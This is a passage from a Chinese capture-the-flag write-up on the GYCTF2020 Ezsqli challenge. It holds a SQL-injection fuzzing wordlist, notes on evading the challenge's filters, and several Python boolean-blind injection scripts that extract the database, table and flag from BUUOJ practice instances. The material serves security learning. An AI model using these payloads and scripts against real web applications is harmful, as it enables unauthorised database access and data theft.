class="hljs-built_in">regexp</span>(&#x27;flag&#x27;))),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure><p>去掉reverse再看，然后拼起来就行。</p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>唉，孙笑川，晦气啊。</p><p><img src="/img/GYCTF2020Ezsqli1.png" alt="GYCTF2020Ezsqli1"></p><p>先看怎么闭合的<code>1&#39;#</code>：</p><p><img src="/img/GYCTF2020Ezsqli2.png" alt="GYCTF2020Ezsqli2"></p><p>初步猜测布尔盲注，尝试<code>1#</code></p><p><img src="/img/GYCTF2020Ezsqli3.png" alt="GYCTF2020Ezsqli3"></p><p>数字型注入</p><p><img src="/img/GYCTF2020Ezsqli5.png" alt="GYCTF2020Ezsqli5"></p><p><code>FUZZ</code>一下看看都过滤了啥：</p><p>我用的是这个字典，可以参考一下(用burpsuite FUZZ的话记得设置一下间隔，也就是Fixed参数)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">length <br>Length<br>+<br><span class="hljs-keyword">handler</span><br><span class="hljs-keyword">like</span><br><span class="hljs-keyword">LiKe</span><br><span class="hljs-keyword">select</span><br><span class="hljs-keyword">SeleCT</span> <br>sleep<br>SLEEp<br><span class="hljs-keyword">database</span><br><span class="hljs-keyword">DATABASe</span><br><span class="hljs-keyword">delete</span><br><span class="hljs-keyword">having</span><br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">oR</span><br><span class="hljs-keyword">as</span><br><span class="hljs-keyword">As</span><br>-~<br>BENCHMARK<br><span class="hljs-keyword">limit</span><br><span class="hljs-keyword">LimIt</span><br>left<br>Left<br><span class="hljs-keyword">select</span><br><span class="hljs-keyword">SELECT</span><br><span class="hljs-keyword">insert</span><br><span class="hljs-keyword">insERT</span><br><span class="hljs-keyword">INSERT</span><br>right<br>#<br><span class="hljs-comment">--+</span><br>INFORMATION<br><span class="hljs-comment">--</span><br>;<br>!<br>%<br>+<br>xor<br>&lt;&gt;<br>(<br>&gt;<br>&lt;<br>)<br>.<br>^<br>=<br><span class="hljs-keyword">AND</span><br><span class="hljs-keyword">ANd</span><br><span class="hljs-keyword">BY</span><br><span class="hljs-keyword">By</span><br><span class="hljs-keyword">CAST</span><br><span class="hljs-keyword">COLUMN</span><br><span class="hljs-keyword">COlumn</span><br>COUNT<br>Count<br><span class="hljs-keyword">CREATE</span><br><span class="hljs-keyword">END</span><br><span class="hljs-keyword">case</span><br><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br><span class="hljs-string">when</span><br><span class="hljs-string">admin&#x27;</span><br>&quot;<br>length <br>+<br>REVERSE<br>ascii<br>ASSIC<br>ASSic<br>select <br>database<br>left<br>right<br>union<br>UNIon<br>UNION<br>&quot;<br>&amp;<br>&amp;&amp;<br>||<br>oorr<br>/<br>//<br>/<span class="hljs-comment">/*</span><br><span class="hljs-comment">*/</span>*<br><span class="hljs-comment">/**/</span><br>anandd<br><span class="hljs-keyword">GROUP</span><br><span class="hljs-keyword">HAVING</span><br><span class="hljs-keyword">IF</span><br><span class="hljs-keyword">INTO</span><br><span class="hljs-keyword">JOIN</span><br>LEAVE<br>LEFT<br><span class="hljs-keyword">LEVEL</span><br>sleep<br><span class="hljs-keyword">LIKE</span><br>NAMES<br>NEXT<br><span class="hljs-keyword">NULL</span><br><span class="hljs-keyword">OF</span><br><span class="hljs-keyword">ON</span><br>|<br>infromation_schema<br><span class="hljs-keyword">user</span><br><span class="hljs-keyword">OR</span><br><span class="hljs-keyword">ORDER</span><br>ORD<br><span class="hljs-keyword">SCHEMA</span><br><span class="hljs-keyword">SELECT</span><br><span class="hljs-keyword">SET</span><br><span class="hljs-keyword">TABLE</span><br><span class="hljs-keyword">THEN</span><br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">UPDATE</span><br><span class="hljs-keyword">USER</span><br><span class="hljs-keyword">USING</span><br><span class="hljs-keyword">VALUE</span><br><span class="hljs-keyword">VALUES</span><br><span class="hljs-keyword">WHEN</span><br><span class="hljs-keyword">WHERE</span><br><span class="hljs-keyword">ADD</span><br><span class="hljs-keyword">AND</span><br><span class="hljs-keyword">prepare</span><br><span class="hljs-keyword">set</span><br><span class="hljs-keyword">update</span><br><span class="hljs-keyword">delete</span><br><span class="hljs-keyword">drop</span><br>inset<br><span class="hljs-keyword">CAST</span><br><span class="hljs-keyword">COLUMN</span><br>CONCAT<br>GROUP_CONCAT<br>group_concat<br><span class="hljs-keyword">CREATE</span><br><span class="hljs-keyword">DATABASE</span><br>DATABASES<br><span class="hljs-keyword">alter</span><br><span class="hljs-keyword">DELETE</span><br><span class="hljs-keyword">DROP</span><br>floor<br>rand()<br>information_schema.<span class="hljs-keyword">tables</span><br>TABLE_SCHEMA<br>%df<br>concat_ws()<br>concat<br><span class="hljs-keyword">LIMIT</span><br>ORD<br><span class="hljs-keyword">ON</span><br>extractvalue<br><span class="hljs-keyword">order</span> <br>CAST()<br><span class="hljs-keyword">by</span><br><span class="hljs-keyword">ORDER</span><br>OUTFILE<br><span class="hljs-keyword">RENAME</span><br>REPLACE<br><span class="hljs-keyword">SCHEMA</span><br><span class="hljs-keyword">SELECT</span><br><span class="hljs-keyword">SET</span><br>updatexml<br><span class="hljs-keyword">SHOW</span><br><span class="hljs-keyword">SQL</span><br><span class="hljs-keyword">TABLE</span><br><span class="hljs-keyword">THEN</span><br><span class="hljs-keyword">TRUE</span><br>instr<br>benchmark<br><span class="hljs-keyword">format</span><br>bin<br>substring<br>ord<br> <br><span class="hljs-keyword">UPDATE</span><br><span class="hljs-keyword">VALUES</span><br><span class="hljs-type">VARCHAR</span><br><span class="hljs-keyword">VERSION</span><br><span class="hljs-keyword">WHEN</span><br><span class="hljs-keyword">WHERE</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">`</span><br><span class="hljs-comment">  </span><br><span class="hljs-comment">,</span><br><span class="hljs-comment">users</span><br><span class="hljs-comment">%0a</span><br><span class="hljs-comment">%0A</span><br><span class="hljs-comment">%0b</span><br><span class="hljs-comment">mid</span><br><span class="hljs-comment">for</span><br><span class="hljs-comment">BEFORE</span><br><span class="hljs-comment">REGEXP</span><br><span class="hljs-comment">RLIKE</span><br><span class="hljs-comment">in</span><br><span class="hljs-comment">sys schemma</span><br><span class="hljs-comment">SEPARATOR</span><br><span class="hljs-comment">XOR</span><br><span class="hljs-comment">CURSOR</span><br><span class="hljs-comment">FLOOR</span><br><span class="hljs-comment">sys.schema_table_statistics_with_buffer</span><br><span class="hljs-comment">INFILE</span><br><span class="hljs-comment">count</span><br><span class="hljs-comment">%0c</span><br><span class="hljs-comment">from</span><br><span class="hljs-comment">%0d</span><br><span class="hljs-comment">%a0</span><br><span class="hljs-comment">=</span><br><span class="hljs-comment">@</span><br><span class="hljs-comment">else</span><br><span class="hljs-comment">%27</span><br><span class="hljs-comment">%23</span><br><span class="hljs-comment">%22</span><br><span class="hljs-comment">%20</span><br></code></pre></td></tr></table></figure><p><img src="/img/2020ezsqli1.png" alt="2020ezsqli1"></p><p>主要是过滤了<code>information_schema.tables</code>这东西，但注意：</p><p><img src="/img/2020ezsqli2.png" alt="2020ezsqli2"></p><p><code>sys</code>这个没过滤，而且经过测试直接打<code>or</code>没问题，但连起来比如<code>0 or 1=1 #</code>这种还会被检测到。。</p><p><code>if</code>,<code>^</code>,<code>&amp;&amp;</code>能用，比如：</p><p><code>if(1,1,2)</code>这里会返回<code>nu1l</code>，可以在第一个<code>1</code>上做文章</p><p><code>0^1</code>返回<code>nu1l</code>，<code>1&amp;&amp;1</code>返回<code>nu1l</code></p><p>拿<code>if</code>来说，爆库可以使用：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">if</span>(<span class="hljs-built_in">ascii</span>(<span class="hljs-built_in">substr</span>(<span class="hljs-built_in">database</span>(),&#123;&#125;,<span class="hljs-number">1</span>))&gt;&#123;&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<span class="hljs-selector-class">.format</span>&#123;<span class="hljs-selector-tag">i</span>,<span class="hljs-selector-tag">j</span>&#125;<br></code></pre></td></tr></table></figure><p>即</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><br>url = <span class="hljs-string">&#x27;http://687df149-6e4c-4d22-9035-80478f031581.node4.buuoj.cn:81/index.php&#x27;</span>  <br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">50</span>):<br>    time.sleep(<span class="hljs-number">0.02</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br><br>        payload = <span class="hljs-string">&quot;if(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;,1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i, j)<br>        data = &#123;<span class="hljs-string">&quot;id&quot;</span>: payload&#125;<br>        res = requests.post(url=url, data=data)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>            flag = flag + <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-comment">#print(i)</span><br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>二分法还不是很熟练。。这个跑的有点慢╮(╯-╰)╭而且会跑出不正确的字符。。这里参考了其它师傅地道二分法脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#参考https://blog.csdn.net/l2872253606/article/details/125247898</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url=<span class="hljs-string">&#x27;http://51803b08-9d22-46c8-b50e-33d3fe778c2b.node4.buuoj.cn:81/&#x27;</span><br>f=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200</span>):<br>    time.sleep(<span class="hljs-number">0.02</span>)<br><br>    <span class="hljs-built_in">min</span>=<span class="hljs-number">32</span><br>    <span class="hljs-built_in">max</span>=<span class="hljs-number">127</span><br>    mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        payload=<span class="hljs-string">&quot;1^(ascii(substr((select database()),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">str</span>(mid)) <span class="hljs-comment">#give_grandpa_pa_pa_pa</span><br>        <span class="hljs-comment">#payload = &quot;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(str(i), str(mid))#f1ag_1s_h3r3_hhhhh,users233333333333333</span><br>        data=&#123;<br>            <span class="hljs-string">&quot;id&quot;</span>:payload<br>        &#125;<br>        s=requests.post(url=url,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Nu1L&quot;</span> <span class="hljs-keyword">in</span> s.text:<br>            <span class="hljs-built_in">min</span>=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">max</span>=mid<br>        mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span><br>    f+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(f)<br><br></code></pre></td></tr></table></figure><p><code>give_grandpa_pa_pa_pa</code></p><p>FUZZ的时候过滤了<code>information_schema</code>，所以用<code>sys.schema_table_statistics_with_buffer</code>代替<code>information_schema.tables</code>。但最终爆列的时候还是要用到<code>infomation_schema</code>这东西，所以得考虑其它注入方式，这里用到了无列名注入和<code>ASCII</code>偏移。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;b&#x27;</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;abcdefg&#x27;</span>)<br>#返回<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;b&#x27;</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;c&#x27;</span>)<br>#返回<span class="hljs-number">0</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;bb&#x27;</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;ba&#x27;</span>)<br>#返回<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;bb&#x27;</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;ba&#x27;</span>)<br>#返回<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;bb&#x27;</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>,<span class="hljs-string">&#x27;ba&#x27;</span>)<br>#返回<span class="hljs-number">0</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;1&#x27;</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;a&#x27;</span>)<br>#返回<span class="hljs-number">0</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;a&#x27;</span>)<br>#返回<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span>)<br>#返回<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;~&#x27;</span>)<br>#返回<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;flag&#x27;</span>) <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;f&#x27;</span>)<br>#返回<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><blockquote><p>比较的时候，1&#x3D;’1’，但’1’&lt;’a’，且1&gt;’a’，经测可知，数字&gt;字符。</p></blockquote><p>所以可以用如下方法测试列数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-number">1</span><span class="hljs-operator">^</span>((<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<span class="hljs-operator">&gt;</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> f1ag_1s_h3r3_hhhhh))<span class="hljs-operator">^</span><span class="hljs-number">1</span><br><br><span class="hljs-number">0</span><span class="hljs-operator">^</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<span class="hljs-operator">&gt;</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> f1ag_1s_h3r3_hhhhh))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&#x27;http://8e176081-905d-4063-a906-4eed1f03ed17.node3.buuoj.cn/index.php&#x27;</span><br>payload=<span class="hljs-string">&#x27;0^((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">128</span>):<br>        hexchar=flag+<span class="hljs-built_in">chr</span>(i)<br>        py=payload.<span class="hljs-built_in">format</span>(hexchar)<br>        datas=&#123;<span class="hljs-string">&#x27;id&#x27;</span>:py&#125;<br>        re=requests.post(url=url,data=datas)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            flag+=<span class="hljs-built_in">chr</span>(i-<span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#或者</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">to_hex</span>(<span class="hljs-params">s</span>):  <span class="hljs-comment"># 十六进制转换 fl ==&gt; 0x666c，可以避免一些如&quot;fla&quot;&quot;这种符号问题导致执行错误以及检测bypass</span><br>    res = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        res += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    res = <span class="hljs-string">&#x27;0x&#x27;</span> + res<br>    <span class="hljs-keyword">return</span> res<br><br><br>url = <span class="hljs-string">&quot;http://3a960679-ba2d-46e9-8e31-605a16a949a9.node4.buuoj.cn:81/&quot;</span><br>s = <span class="hljs-string">&quot;&quot;</span><br>last = <span class="hljs-string">&#x27;tmp&#x27;</span><br><span class="hljs-keyword">while</span>(s.strip() != last):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        flag = s + <span class="hljs-built_in">chr</span>(j)<br>        payload = <span class="hljs-string">&quot;1^((1,&#123;0&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))^1&quot;</span>.<span class="hljs-built_in">format</span>(to_hex(flag))<br>        data = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: payload<br>        &#125;<br>        r = requests.post(url, data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Nu1L&quot;</span> <span class="hljs-keyword">in</span> r.content:<br>            last = s.strip()<br>            s += <span class="hljs-built_in">chr</span>(j-<span class="hljs-number">1</span>)  <span class="hljs-comment"># &#x27;F&#x27;&lt;&#x27;FLAG&#x27;,&#x27;G&#x27;&gt;&#x27;FLAG&#x27;,所以要减1</span><br>            <span class="hljs-built_in">print</span>(s.lower())<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>匹配flag的时候，一定会先经过匹配到字符相等的情况，这个时候返回的是0。很明显此时的chr(char)并不是我们想要的，我们在输出1(Nu1L)的时候，匹配的是f的下一个字符g，而我们想要的是f，此时chr(char-1)&#x3D;’f’，所以这里要用chr(char-1)。</p><p>看了wp还有这种方式：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>import requests<br>url = <span class="hljs-string">&quot;http://2070e1dc-ce1b-4d1c-ae33-f747d0ae05e8.node3.buuoj.cn/index.php&quot;</span><br>payload1 = <span class="hljs-string">&quot;if((ascii(substr(database(),&quot;</span><br>payload2 = <span class="hljs-string">&quot;,1))=&quot;</span><br>payload3 = <span class="hljs-string">&quot;),1,2)&quot;</span><br>name = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">22</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">23</span>,<span class="hljs-number">123</span>):<br>        payload = payload1+<span class="hljs-built_in">str</span>(i)+payload2+<span class="hljs-built_in">str</span>(j)+payload3<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>        s = requests<span class="hljs-selector-class">.post</span>(url,data=data)<span class="hljs-selector-class">.text</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;Nu1L&quot;</span> <span class="hljs-keyword">in</span> s):<br>            name += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(name)<br>            break<br></code></pre></td></tr></table></figure><p>参考：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span 